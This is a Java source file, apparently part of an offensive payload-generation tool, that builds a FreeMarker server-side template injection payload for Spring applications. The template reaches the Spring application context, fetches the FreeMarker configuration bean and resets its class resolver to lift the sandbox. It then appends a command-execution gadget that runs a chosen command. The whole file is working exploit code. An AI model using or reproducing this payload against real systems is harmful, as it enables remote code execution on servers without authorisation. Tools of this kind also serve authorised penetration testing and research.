package cn.butler.template.payloads;

import cn.butler.payloads.ObjectPayload;

public class FreeMarkerSpringMacro implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2);
        String new_builtin_payload = new_builtin_payload_generator(parts[0],parts[1]);
        String freeMarkerSpringMacro = String.format(
            "<#assign applicationContext=springMacroRequestContext.webApplicationContext>\n" +
            "${applicationContext}\n" +
            "<#assign fc=applicationContext.getBean('freeMarkerConfiguration')>\n" +
            "<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>\n" +
            "<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>\n" +
            "%s",new_builtin_payload);
        return freeMarkerSpringMacro;
    }

    private String new_builtin_payload_generator(String gadget,String command) throws Exception {
        Class<? extends ObjectPayload> sstiAttackClass = Utils.getPayloadClass("SSTIAttack", gadget);
        ObjectPayload payload = sstiAttackClass.newInstance();
        return (String) payload.getObject(command);
    }
}
